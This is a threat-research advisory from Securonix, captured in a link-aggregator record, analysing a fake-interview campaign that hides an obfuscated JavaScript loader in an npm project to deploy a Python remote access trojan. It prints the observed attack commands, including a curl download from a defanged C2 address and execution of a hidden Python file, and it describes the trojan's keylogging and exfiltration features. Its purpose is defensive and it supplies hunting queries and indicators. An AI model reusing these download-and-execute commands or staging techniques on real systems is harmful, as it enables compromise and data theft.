{"aid": "40178756", "title": "Targeting developers using fake interviews to deliver a Python-based RAT", "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/", "domain": "securonix.com", "votes": 1, "user": "skilled", "posted_at": "2024-04-27 10:01:32", "comments": 0, "source_title": "Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors", "source_text": "Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers\nLikely Associated With North Korean Threat Actors - Securonix\n\nBlog\n\n# Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers\nLikely Associated With North Korean Threat Actors\n\nThreat Research\n\nShare\n\nLinkedInTwitterFacebookShare\n\n### Securonix Threat Research Security Advisory \u2013 Fast Track/Early-Warning\nCoverage Advisory (FCA)\n\n# EARLY DRAFT \u2013 Analysis of DEV#POPPER: New Attack Campaign Targeting Software\nDevelopers Likely Associated With North Korean Threat Actors\n\n#### By Securonix Threat Research: D.Iuzvyk, T. Peck, O.Kolesnikov\n\nApr 24, 2024\n\n## tldr:\n\nThe Securonix Threat Research Team has been monitoring a new ongoing social\nengineering attack campaign (tracked by STR as DEV#POPPER) likely associated\nwith North Korean threat actors who are targeting developers using fake\ninterviews to deliver a Python-based RAT.\n\nThe Threat Research team has been investigating a new threat campaign (tracked\nby STR as DEV#POPPER) that\u2019s been targeting software developers. STR has been\nable to identify malicious software repositories used by attackers as part of\nthe attack campaign, which we\u2019ll delve deeper into to get a better\nunderstanding as to how the malicious threat actors infect systems and their\ncapabilities.\n\nIntroduction\n\nSocial engineering is an advanced tactic used by threat actors to manipulate\nindividuals into divulging confidential information or performing actions that\nthey might normally not. The attacker\u2019s goal is to trick the user into\nunknowingly compromising themselves or place of employment. Unlike traditional\nhacking methods which rely on exploitation, social engineering targets human\nvulnerabilities by exploiting psychological manipulation. This method plays on\nbasic human traits such as trust, fear or the desire to simply be helpful.\n\nIn the case of the DEV#POPPER attack campaign we\u2019ve been observing, an\ninteresting form of social engineering was noted which involves the targeting\nof specific professional groups such as software developers. This technique,\nwhile not extremely prevalent at the moment, is still ongoing and has been\nreported a number of times in the past by North Korean threat actors.\n\nIn summary, an example of this is where attackers set up fake job interviews\nfor developers, pretending to be legitimate job interviewers. During these\nfraudulent interviews, the developers are often asked to perform tasks that\ninvolve downloading and running software from sources that appear legitimate,\nsuch as GitHub. The software contained a malicious Node JS payload that, once\nexecuted, compromised the developer\u2019s system.\n\nThis method is effective because it exploits the developer\u2019s professional\nengagement and trust in the job application process, where refusal to perform\nthe interviewer\u2019s actions could compromise the job opportunity. The attackers\ntailor their approach to appear as credible as possible, often by mimicking\nreal companies and replicating actual interview processes. This guise of\nprofessionalism and legitimacy lulls the target into a false sense of\nsecurity, making it easier to deploy malware without arousing suspicion.\n\nNote \u2013 At the time of publication, the attackers GitHub repositories we\nanalyze below have already been deleted. However, members of the cybersecurity\ncommunity have picked up on other GitHub hosted samples as well.\n\n## Stage 1: Malicious NPM package\n\nThe first stage involves downloading a zip archive from GitHub which would\nhave been sent to the interviewee from the interviewer. The zip archive\ncontains a legitimate looking Node Package Manager (NPM) package containing a\nREADME.md, and Frontend and Backend directories.\n\nBuried in the Backend directory was a single JavaScript file which on the\nsurface appears to be a simple code snippet using Mongoose, which is a Node.js\npackage that provides MongoDB object modeling in an asynchronous environment.\n\nFigure x: imageDetails.js \u2013 unusually long scroll bar\n\nHowever, closer examination reveals a huge line of highly obfuscated code when\nscrolling way over to the right. An example of how large this is can be seen\nby looking at the scrollbar in the figure above. The gif in the figure below\nalso demonstrates this as you can see the obfuscated code past a large comment\nblock on the right.\n\nFigure x: Video highlighting the malicious JavaScript code out of view\n\nRemoving the JavaScript code from imageDetails.js and placing it into its own\nfile allows us to analyze it a bit easier. The is obfuscated using several\nlayers of obfuscation including base64 and variable substitutions.\n\nFigure x: Extracted obfuscated JavaScript code from imageDetails.js.\n\n## Stage 2: Command execution and payload download\n\nWhen the victim eventually executes the malicious NPM package, the malicious\nJavaScript code in Stage 1 is executed through the NodeJS process (node.exe).\nThe purpose of the malicious script in Stage 1 is simply to download and\nextract an archive file, extract it and then execute the next stage.\n\nThrough the node.exe process we observed the following commands:\n\nCommand| Purpose  \n---|---  \ncmd.exe /d /s /c \u201ccurl -lo \u201cC:\\Users\\\\[REDACTED]\\AppData\\Local\\Temp\\p.zi\u201d\n\u201chxxp://147.124.214[.]131:1244/pdown\u201d| Download next stage payload \u201cp.zi\u201d  \ntar -xf C:\\Users\\\\[REDACTED]\\AppData\\Local\\Temp\\p2.zip -c\nc:\\users\\\\[REDACTED]\u201d| Using the tar command, extract zip file into the user\u2019s\ntemp directory  \ncmd.exe /d /s /c \u201c\u201dc:\\users\\\\[REDACTED]\\\\.pyp\\python.exe\u201d\n\u201cc:\\users\\\\[REDACTED]\\\\.npl\u201d| Run python.exe and execute the hidden file which\nwas just extracted \u201c.npl\u201d  \n  \n## Stage 3: Python code execution \u2013 .npl\n\nThe \u201c.npl\u201d file is technically a Python file, without an extension and uses a\nstarting dot \u201c.\u201d to indicate to the operating system that it is a hidden file.\nThis may or may not be hidden from view to the user depending on their\noperating system settings.\n\nThe file contains a large base64 payload and uses a combination of string\nmanipulation and decoding to execute the Python code hidden inside of it.\nBase64 encoding and XOR logic are used for the content behind the hidden\nstring. This is then executed as Python code using exec().\n\nFigure x: Python execution .npl file contents\n\nThe decoded result contains several key variables such as its current path and\na hard-coded C2 server: hxxp://147.124.214[.]131:1244. The Python script then\ncalls and executes another Python script which is located at\nC:\\Users\\Redacted\\\\.n2/pay.\n\n## Stage 3: Python code execution \u2013 pay\n\nThe \u201cpay\u201d script is also an extensionless file similar to the first Python\nscript we analyzed. This next script contains similar payload execution\ntactics where a Base64 string is decoded in the same fashion, however two\nunique strings are executed. Each of these can be seen in the figure below.\n\nFigure x: res \u2013 Python file contents\n\nThe first decoded code string executes and gathers system and network\ninformation from an infected computer and then sends this data to a remote\nserver which includes the following:\n\n  * Operating system type\n  * Hostname\n  * OS release version\n  * OS version\n  * Username of the logged-in user\n  * A unique identifier for the device (uuid) generated by hashing the MAC address and username\n\nThis information is gathered and then transmitted in a JSON-like format back\nto the attacker\u2019s C2 server by issuing a carefully crafted HTTP POST request.\n\nThe second decoded and executed string is much longer than the first and\ncontains quite a bit more functionality. Once executed, the script functions\nsimilarly to a RAT (Remote Access Trojan), allowing the attacker to interact\nwith the victim\u2019s machine remotely. After analyzing the decoded portion of the\nscript, we observed the following capabilities:\n\n  * Networking and session creation: Used for persistent connections: This establishes persistent TCP connections including structuring and sending JSON formatted data.\n  * File system interaction: Contains functions to traverse directories and filter files based on specific extensions and directories to exclude. It can also locate and potentially exfiltrate files that do not match certain criteria (like file size and extension).\n  * Remote command execution: The script contains several functions which allow for the execution of system shell commands and scripts.. This includes browsing the filesystem and executing shell commands.\n  * Data Handling and transmission: Functionality for encoding data over an established TCP connection. It handles data reception, decoding different character encodings and manages transmission errors and timeouts.\n  * Exfiltration and uploading: For exfiltration,the Python script is able to send files to a remote FTP server with the ability to filter in or out files based on its extension. Other functions exist to help automate this process by collecting data from various user directories like Documents and Downloads.\n  * Clipboard and keystroke logging: The script includes capabilities to monitor and exfiltrate clipboard contents and keystrokes.\n\n## Securonix recommendations\n\nWhen it comes to attacks which originate through social engineering, it\u2019s\ncritical to maintain a security-focused mindset, especially during intense and\nstressful situations like job interviews. The attackers behind the DEV#POPPER\ncampaigns abuse this, knowing that the person on the other end is in a highly\ndistracted and in a much more vulnerable state. When it comes to prevention\nand detection, the Securonix Threat Research team recommends:\n\n  * Raise awareness to the fact that people are targets of social engineering attacks just as technology is exploitation. Remaining extra vigilant and security continuous, even during high-stress situations is critical to preventing the issue altogether.\n  * In case of code execution, monitor common malware staging directories, especially script-related activity in world-writable directories. In the case of this campaign the threat actors staged in subdirectories found in the user\u2019s %APPDATA% directory.\n  * Monitor for the usage of non-default scripting languages such as Python on endpoints and servers which should normally not execute it. To assist in this, leverage additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage.\n  * Securonix customers can scan endpoints using the Securonix hunting queries below.\n\n## MITRE ATT&CK Matrix\n\nTactics| Techniques  \n---|---  \nCollection| T1560: Archive Collected Data  \nCommand and Control| T1132: Data Encoding  \nDefense Evasion| T1027.010: Obfuscated Files or Information: Command\nObfuscationT1070.004: Indicator Removal: File Deletion  \nDiscovery| T1033: System Owner/User Discovery T1082: System Information\nDiscovery  \nExecution| T1059.001: Command and Scripting Interpreter: PowerShellT1059.003:\nCommand and Scripting Interpreter: Windows Command ShellT1059.006: Command and\nScripting Interpreter: Python  \nExfiltration| T1041: Exfiltration Over C2 Channel  \n  \n## Relevant provisional Securonix detections\n\n  * EDR-ALL-930-RU\n  * EDR-ALL-1246-RU\n  * NGF-ALL-833-ER\n\n## Relevant hunting queries\n\n#### (remove square brackets \u201c[ ]\u201d for IP addresses or URLs)\n\n  * index = activity AND rg_functionality = \u201cWeb Proxy\u201d AND (destinationaddress = \u201c147.124.214[.]131\u201d OR destinationaddress = \u201c173.211.106[.]101\u201d)\n  * index = activity AND rg_functionality = \u201cNext Generation Firewall\u201d AND (destinationaddress = \u201c147.124.214[.]131\u201d OR destinationaddress = \u201c173.211.106[.]101\u201d)\n  * index = activity AND rg_functionality = \u201cEndpoint Management Systems\u201d AND (deviceaction = \u201cNetwork connection detected\u201d OR deviceaction = \u201cNetwork connection detected (rule: NetworkConnect)\u201d) AND destinationport=\u201d1244\u2032\u2032)\n  * index = activity AND rg_functionality = \u201cEndpoint Management Systems\u201d AND (deviceaction = \u201cProcess Create\u201d OR deviceaction = \u201cProcess Create (rule: ProcessCreate)\u201d OR deviceaction = \u201cProcessRollup2\u201d OR deviceaction = \u201cProcstart\u201d OR deviceaction = \u201cProcess\u201d OR deviceaction = \u201cTrace Executed Process\u201d) AND destinationprocessname ENDS WITH \u201cpython.exe\u201d AND (destinationprocessname ENDS WITH \u201ccmd.exe\u201d OR destinationprocessname ENDS WITH \u201cpowershell.exe\u201d) (changed destinationhostname to destinationprocessname and CONTAINS to ENDS WITH on both)\n\n## C2 and infrastructure\n\nC2 Address  \n---  \n147.124.214[.]131  \n173.211.106[.]101  \n  \n## Analyzed files/hashes\n\nFile Name| SHA256  \n---|---  \nsports_platform_app-main.zip|\n45c991529a421104f2edf03d92e01d95774bf54325f9107dd4139505912a0c1e  \nimageDetails.js|\n33617F0AC01A0F7FA5F64BD8EDEF737F678C44E677E4A2FB23C6B8A3BCD39FA2  \n.npl| F9CA12321FB91157CCE8513E935810D1C2005AB0739322B474F0CB4AF2605D16  \npay| 977A9024962102B02128D391C0543C63328D3F26701ECA1A5D282AF4D493DC2E  \n  \n### References:\n\n  1. Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/\n\nFacebookTwitterEmailShare\n\nPREVIOUS ARTICLE\n\n#### Securonix Threat Research Security Advisory: Analysis of Ongoing\nFROZEN#SHADOW Attack Campaign Leveraging SSLoad Malware and RMM Software for\nDomain Takeover\n\nNEXT ARTICLE\n\n#### AI-Reinforced: The Engine Powering the Securonix CyberOps Revolution\n\n##### Related Resource\n\n  * Analysis of DEV#POPPER: New Attack Campaign Targeting...\n  * Securonix Threat Research Security Advisory: Analysis...\n  * Securonix Threat Research Knowledge Sharing Series:...\n  * Securonix Threat Research Security Advisory: Analysis...\n\n  * Why Securonix?\n\n    * Why Securonix?\n    * Analyst Resources\n    * Overview\n    * Compare Us\n  * Products\n\n    * Platform\n    * Bring Your Own Snowflake\n    * Bring Your Own AWS\n    * Unified Defense SIEM\n    * UEBA\n    * SOAR\n    * ATS\n    * Investigate\n\n  * Solutions\n\n    * Cloud Security\n    * Google Cloud Platform\n    * Microsoft Azure\n    * Microsoft 365\n    * Amazon Web Services\n    * Insider Threat\n    * NDR\n    * EMR Monitoring\n    * Healthcare\n    * Manufacturing\n    * Financial Services\n\n  * Resources\n\n    * Resource Library\n    * Threat Labs\n    * Legal Center\n    * Open Source Software Listing \u2013 5.0\n    * Open Source Software Listing \u2013 6.0\n  * Company\n\n    * About\n    * Newsroom\n    * Careers\n    * Blog\n\n  * Services\n\n    * Training\n    * Support Services\n    * Professional Services\n  * Partners\n\n    * Global System Integrators\n    * MSSPs\n    * Solution Providers\n    * Technology Alliance\n    * Distributors\n    * Partner Portal Login\n\nSecuronix 2024. All Rights Reserved\n\nLegal Center | Privacy Policy\n\nContact Us\n\n\u2713\n\nThanks for sharing!\n\nAddToAny\n\nMore...\n\n\u00d7\n\nWe Value Your Privacy\n\nSettings\n\nNextRoll, Inc. (\"NextRoll\") and our 18 advertising partners use cookies and\nsimilar technologies on this site and use personal data (e.g., your IP\naddress). If you consent, the cookies, device identifiers, or other\ninformation can be stored or accessed on your device for the purposes\ndescribed below. You can click \"Allow All\" or \"Decline All\" or click Settings\nabove to customise your consent regarding the purposes and features for which\nyour personal data will be processed and/or the partners with whom you will\nshare personal data.\n\nNextRoll and our advertising partners process personal data to: \u25cf Store and/or\naccess information on a device; \u25cf Create a personalised content profile; \u25cf\nSelect personalised content; \u25cf Personalised advertising, advertising\nmeasurement, audience research and services development; \u25cf Services\ndevelopment. For some of the purposes above, our advertising partners: \u25cf Use\nprecise geolocation data. Some of our partners rely on their legitimate\nbusiness interests to process personal data. View our advertising partners if\nyou wish to provide or deny consent for specific partners, review the purposes\neach partner believes they have a legitimate interest for, and object to such\nprocessing.\n\nIf you select Decline All, you will still be able to view content on this site\nand you will still receive advertising, but the advertising will not be\ntailored for you. You may change your setting whenever you see the on this\nsite.\n\nDecline All\n\nAllow All\n\n", "frontpage": false}
